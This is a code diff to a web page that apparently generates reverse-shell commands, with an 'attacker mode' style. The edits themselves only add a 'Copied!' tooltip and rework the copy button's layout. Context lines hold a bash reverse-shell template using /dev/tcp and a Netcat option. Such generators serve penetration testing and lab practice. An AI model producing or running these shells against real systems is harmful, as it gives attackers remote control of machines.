@@ -105,6 +105,29 @@
         .attacker-mode .glass-card { background: rgba(20, 10, 10, 0.6); border-color: rgba(239, 68, 68, 0.2); }
         .input-glow-blue:focus { box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
         .input-glow-red:focus { box-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }
+        
+        /* Copied Tooltip */
+        .copy-tooltip {
+            position: absolute;
+            bottom: 100%; /* Position above the button */
+            left: 50%;
+            transform: translateX(-50%);
+            margin-bottom: 0.5rem;
+            background-color: #10B981;
+            color: white;
+            padding: 0.25rem 0.75rem;
+            border-radius: 0.5rem;
+            font-size: 0.875rem;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        .copy-tooltip.visible {
+            opacity: 1;
+            transform: translateX(-50%) translateY(-5px);
+        }
     </style>
 </head>
 <body>
@@ -164,11 +187,15 @@
                              <option value="nc">Netcat</option>
                          </select>
                      </div>
-                     <div class="bg-black rounded-xl p-4 font-mono text-sm text-green-400 relative min-h-[6rem]">
-                         <pre class="overflow-x-auto pb-1"><code id="generated-shell"></code></pre>
-                         <button id="copy-shell-btn" class="absolute top-2 right-2 text-gray-400 hover:text-white transition-colors" title="Copy Command">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
-                         </button>
+                     <!-- Corrected Code Block using Flexbox -->
+                     <div class="bg-black rounded-xl font-mono text-sm text-green-400 flex items-center p-4">
+                        <pre class="overflow-x-auto flex-grow"><code id="generated-shell"></code></pre>
+                        <div class="relative flex-shrink-0 ml-4">
+                            <span id="copy-tooltip" class="copy-tooltip">Copied!</span>
+                            <button id="copy-shell-btn" class="text-gray-400 hover:text-white transition-colors" title="Copy Command">
+                               <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
+                            </button>
+                        </div>
                      </div>
                 </div>
             </div>
@@ -271,6 +298,7 @@
         const shellTypeSelect = document.getElementById('shell-type');
         const generatedShellCode = document.getElementById('generated-shell');
         const copyShellBtn = document.getElementById('copy-shell-btn');
+        const copyTooltip = document.getElementById('copy-tooltip');
 
         const shellTemplates = {
             bash: `bash -i >& /dev/tcp/{ip}/{port} 0>&1`,
@@ -305,9 +333,9 @@
         copyShellBtn.addEventListener('click', () => {
             const textToCopy = generatedShellCode.textContent;
             navigator.clipboard.writeText(textToCopy).then(() => {
-                copyShellBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" /></svg>';
+                copyTooltip.classList.add('visible');
                 setTimeout(() => {
-                    copyShellBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>';
+                    copyTooltip.classList.remove('visible');
                 }, 2000);
             });
         });
